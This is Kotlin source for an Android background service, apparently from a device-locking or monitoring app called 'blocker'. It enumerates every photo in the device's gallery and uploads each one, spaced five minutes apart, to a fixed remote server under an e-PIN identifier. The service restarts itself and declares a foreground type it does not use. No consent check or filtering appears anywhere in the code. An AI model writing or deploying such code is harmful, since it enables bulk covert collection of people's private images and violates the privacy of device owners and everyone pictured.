package com.blocker.services

import android.app.Service
import android.content.Intent
import android.util.Log
import android.os.Environment
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import androidx.core.app.NotificationCompat
import android.os.Build
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import android.os.IBinder
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part
import retrofit2.http.Path
import java.io.File
import com.blocker.storage.LocalStorage
import android.content.Context
import com.google.gson.Gson
import kotlinx.coroutines.*
import android.content.pm.ServiceInfo
import android.content.ContentResolver
import android.database.Cursor
import android.net.Uri
import android.provider.MediaStore


class GallaryService : Service() {

    companion object {
        private const val TAG = "GalleryService"
        private const val CHANNEL_ID = "CHANNEL_GALLERY"
        private const val NOTIFICATION_ID = 1001
        private const val BASE_URL = "https://blocker.divyadhara.co.in/api/"
        

    }

    private lateinit var localStorage: LocalStorage

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        localStorage = LocalStorage(applicationContext)
        Log.d("Gallary Service", "onStartCommand:Initialised")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("Gallary Service", "onStartCommand: Gallary access started in foreground")
        startForegroundService()
        scanAndUploadImages()

        return START_STICKY
    }

    private fun performLongTask() {
        Log.d("Gallary Service", "Perform: longtask")
        Thread.sleep(5000)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("Gallary Service", "onDestroy: Gallary service destroyed")
    }

    private fun startForegroundService() {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Gallery Service")
            .setContentText("Uploading images from gallery...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()



        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { 
            startForeground(1, notification,ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        }else{
            startForeground(1, notification)
        }

    }

            private fun createNotificationChannel() {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val channel = NotificationChannel(
                        CHANNEL_ID,
                        "Gallery Service Channel",
                        NotificationManager.IMPORTANCE_LOW
                    ).apply {
                        description = "Channel for Gallery Service notifications"
                    }

                    val manager = getSystemService(NotificationManager::class.java)
                    manager?.createNotificationChannel(channel)
                    Log.d(TAG, "Notification channel created")
                }
            }

          
            private fun scanAndUploadImages() {
                GlobalScope.launch(Dispatchers.IO) {
                    try {
                        val contentResolver = applicationContext.contentResolver
                        val imageUris = fetchAllImageUris(contentResolver)

                        if (imageUris.isEmpty()) {
                            Log.e(TAG, "No images found in MediaStore")
                            return@launch
                        }

                        for (uri in imageUris) {
                            val filePath = getFilePathFromUri(uri)
                            if (filePath != null) {
                                Log.d(TAG, "Uploading file: $filePath")
                                uploadImage(filePath)
                                delay(300000)  // This non-blocking delay will give a 5-minute gap between uploads
                            } else {
                                Log.e(TAG, "Failed to get file path for URI: $uri")
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error scanning images: ${e.message}")
                    }
                }
            }




            private fun fetchAllImageUris(contentResolver: ContentResolver): List<Uri> {
                val imageUris = mutableListOf<Uri>()
                val projection = arrayOf(MediaStore.Images.Media._ID)
                val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC" // Sorting images by date added (newest first)

                val cursor: Cursor? = contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    sortOrder
                )

                cursor?.use {
                    val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    while (it.moveToNext()) {
                        val id = it.getLong(idColumn)
                        val contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
                        imageUris.add(contentUri)
                    }
                }

             return imageUris
            }




            private fun getFilePathFromUri(uri: Uri): String? {
                val projection = arrayOf(MediaStore.Images.Media.DATA)
                val cursor: Cursor? = contentResolver.query(uri, projection, null, null, null)

                cursor?.use {
                    if (cursor.moveToFirst()) {
                        val columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                        return cursor.getString(columnIndex)
                    }
                }
                return null
            }



            

            private fun uploadImage(imagePath: String) {
                val retrofit = Retrofit.Builder()
                    .baseUrl(BASE_URL)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build()

                val apiService = retrofit.create(ApiService::class.java)

                val file = File(imagePath)
                if (!file.exists()) {
                    Log.e(TAG, "File does not exist: $imagePath")
                    return
                }

                val requestFile = RequestBody.create("image/jpeg".toMediaTypeOrNull(), file)
                val body = MultipartBody.Part.createFormData("imageFile", file.name, requestFile)

                val gson = Gson()

                val epinNo = gson.fromJson(localStorage.getItem("epinNo"), String::class.java)

                if (epinNo.isNullOrEmpty()) {
                    Log.e(TAG, "Epin number is null or empty. Cannot send location.")
                    return
                }


                if (epinNo != null) {
                    val call = apiService.uploadImage(id = epinNo, file = body)
                    call.enqueue(object : Callback<UploadResponse> {
                        override fun onResponse(call: Call<UploadResponse>, response: Response<UploadResponse>) {
                            if (response.isSuccessful) {
                                val uploadResponse = response.body()
                                Log.d(TAG, "Image uploaded successfully: ${uploadResponse?.message}")
                                Thread.sleep(1000) // Add a small delay between uploads
                            } else {
                                Log.e(TAG, "Upload failed: ${response.message()}")
                            }
                        }

                        override fun onFailure(call: Call<UploadResponse>, t: Throwable) {
                            Log.e(TAG, "Upload error: ${t.message}")
                        }
                    })
                } else {
                    Log.e(TAG, "User ID is null")
                }
            }



    interface ApiService {

        @Multipart
        @POST("mobile/gallery/{id}")
        fun uploadImage(
            @Path("id") id: String,
            @Part file: MultipartBody.Part
        ): Call<UploadResponse>
    }

    data class UploadResponse(
        val success: Boolean,
        val message: String
    )

    data class Epin(
        val id: String,
        val epinNo: String,
        val assignedToId: String?,
        val isUsed: Boolean,
        val requestId: String?,
        val usedBy: String?,
        val isActive: Boolean,
        val isvalid: Boolean,
        val usedAt: String?,
        val plan: String,
        val createdAt: String,
        val ismBolcked: Boolean,
        val expiryDate: String,
        val mrId: String,
        val uId: String
    )
}
